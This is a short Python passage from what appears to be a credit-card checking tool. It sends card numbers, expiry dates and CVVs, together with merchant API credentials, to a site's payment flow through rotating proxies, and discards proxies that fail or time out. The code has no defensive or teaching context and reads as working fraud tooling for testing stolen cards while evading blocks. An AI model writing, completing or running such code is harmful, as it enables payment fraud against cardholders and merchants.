    client_kwargs = {
        "timeout": httpx.Timeout(35),
        "headers": {"User-Agent": UA},
        "follow_redirects": True,
    }
    if candidate:
        client_kwargs["proxy"] = candidate

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            verdict, message = await _attempt(
                client, site_url, cc, mm, yy, cvv, page, api_login_id, client_key,
                proxy=candidate, ts_token=ts_token, direct=direct
            )
            # A proxy that cannot authenticate is dead weight -- drop it.
            if "407" in message or "proxy authentication" in message.lower():
                _dead_proxies.add(candidate)
            return verdict, message
    except asyncio.TimeoutError:
        _dead_proxies.add(candidate)
        return "Retry", "Error - Gateway timeout"
    except Exception as e:
        _dead_proxies.add(candidate)
        return "Retry", f"Error - {type(e).__name__}: {str(e)[:100]}"
